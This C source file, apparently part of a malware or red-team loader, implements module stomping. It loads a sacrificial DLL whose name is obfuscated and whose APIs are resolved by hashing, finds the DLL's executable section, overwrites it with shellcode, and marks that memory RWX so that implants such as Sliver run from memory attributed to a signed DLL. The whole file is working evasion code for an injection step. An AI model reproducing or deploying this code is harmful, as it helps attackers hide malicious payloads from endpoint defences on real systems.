// =============================================
// Stomper.c - Module Stomping
// Loads a sacrificial DLL and overwrites its
// executable section with shellcode, so the
// shellcode memory is attributed to a signed DLL.
// =============================================

#include "Common.h"

BOOL ModuleStomp(
    IN  PAPI_HASHING pApi,
    IN  PBYTE        pShellcode,
    IN  DWORD        dwShellcodeSize,
    OUT PVOID*       ppExecAddr
) {
    if (!pApi || !pShellcode || !ppExecAddr || dwShellcodeSize == 0)
        return FALSE;

    // Load sacrificial DLL (deobfuscated)
    BYTE xDll[] = XSTR_STOMP_DLL;
    DEOBF(xDll);
    HMODULE hModule = pApi->pLoadLibraryA((LPCSTR)xDll);
    if (!hModule) {
        LOG("[!] Module stomp: LoadLibrary failed");
        return FALSE;
    }
    LOG("[+] Module stomp: sacrificial DLL loaded");

    // Parse PE headers to find executable section
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    PVOID  pTextBase = NULL;
    DWORD  dwTextSize = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            pTextBase = (PVOID)((PBYTE)hModule + pSection[i].VirtualAddress);
            dwTextSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pTextBase || dwTextSize < dwShellcodeSize) {
        LOG("[!] Module stomp: .text section too small or not found");
        return FALSE;
    }

    // Change protection to RW
    DWORD dwOldProtect = 0;
    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwShellcodeSize, PAGE_READWRITE, &dwOldProtect)) {
        LOG("[!] Module stomp: VirtualProtect(RW) failed");
        return FALSE;
    }

    // Overwrite .text with shellcode
    MemCopy(pTextBase, pShellcode, dwShellcodeSize);

    // Change to RWX (required for Go-based shellcode like Sliver that writes to own pages)
    DWORD dwDummy = 0;
    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwShellcodeSize, PAGE_EXECUTE_READWRITE, &dwDummy)) {
        LOG("[!] Module stomp: VirtualProtect(RWX) failed");
        return FALSE;
    }

    *ppExecAddr = pTextBase;
    LOG("[+] Module stomp: shellcode planted in DLL .text section");
    return TRUE;
}
